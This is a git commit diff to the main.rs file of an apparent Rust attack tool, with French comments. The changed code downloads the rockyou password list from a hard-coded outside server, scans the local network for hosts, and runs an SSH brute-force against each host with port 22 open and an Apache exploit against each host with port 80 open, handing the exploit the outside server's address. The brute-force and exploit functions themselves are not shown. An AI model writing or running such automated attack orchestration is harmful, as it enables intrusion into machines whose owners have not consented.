87d3a1c93ab0c6d9fa3c8500f6595496ecd16876
lululufr <lucas.lm.miller@gmail.com>
2024-05-29 17:41:22 +0200

    dynamique over

--- src/main.rs
+++ src/main.rs
@@ -11,13 +11,8 @@ use std::thread;
 use threadpool::ThreadPool;
 use crate::utils::NetworkInterface;
 use std::time::Duration;
-
-
-
-
-
-
-
+use futures::future::join_all;
+use tokio::runtime::Runtime;
 
 
 
@@ -25,56 +20,58 @@ use std::time::Duration;
 async fn main() {
     let ip_target = "192.168.1.122";
     let ip_srv = "51.77.193.65";
-    let port = "8000";
+    let port_srv = "8000";
 
-    //let port_ouvert = scan_ports(ip_target); // donne un tableau de port ouvert
+    utils::get_rockyou(ip_srv, port_srv).await.expect("error : dl rockyou");
 
-    //println!("Open ports: {:?}", port_ouvert);
+    // Crée un runtime tokio
+    let rt = Runtime::new().unwrap();
 
-    utils::get_rockyou(ip_srv, port)
-        .await
-        .expect("error : dl rockyou");
+    // Utilise le runtime tokio pour exécuter du code async dans un thread
+    let handle = thread::spawn(move || {
+        rt.block_on(async {
+            match utils::get_parc_ip().await {
+                Ok(ips_ports) => {
+                    let mut tasks = vec![];
 
+                    for ip in ips_ports.keys() {
+                        println!("ip: {}", ip);
 
-    match utils::get_parc_ip().await {
-        Ok(ips_ports) => {
-            println!("{:?}",ips_ports);
+                        let ports = ips_ports.get(ip).unwrap();
 
+                        for port in ports {
 
-            for ip in ips_ports.keys() {
+                            if port == &22 {
+                                let ip_clone = ip.clone();
+                                let task = tokio::spawn(async move {
+                                    ssh::ssh_bruteforce(&ip_clone, "bibli/").await;
+                                });
+                                tasks.push(task);
+                            }
 
-                println!("ip: {}", ip);
-                println!("port: {:?}", ips_ports.get(ip).unwrap());
+                            if port == &80 {
+                                let ip_clone = ip.clone();
+                                let task = tokio::spawn(async move {
+                                    web::exploit_apache(&ip_clone,ip_srv,port_srv).await;
+                                });
+                                tasks.push(task);
+                            }
 
-            }
-
-
-
-        },
-        Err(e) => {
-            eprintln!("Error: {}", e);
-        }
-    }
-
-
-
-            /*
-                match port_ouvert[1] {
-                    //22 => {
-                    //    ssh::ssh_bruteforce(ip_address, "bibli/").await;
-                    //},
-                    80 => {
-                        web::exploit_apache(ip_target, ip_srv).await;
+                        }
                     }
 
-                    _ => {}
+                    // Attendre que toutes les tâches se terminent
+                    join_all(tasks).await;
+                },
+                Err(e) => {
+                    eprintln!("Error: {}", e);
                 }
-            */
+            }
+        });
+    });
 
-
-
-        }
-
-
+    handle.join().unwrap();
+    println!("Toutes les tâches sont terminées.");
+}
 
 
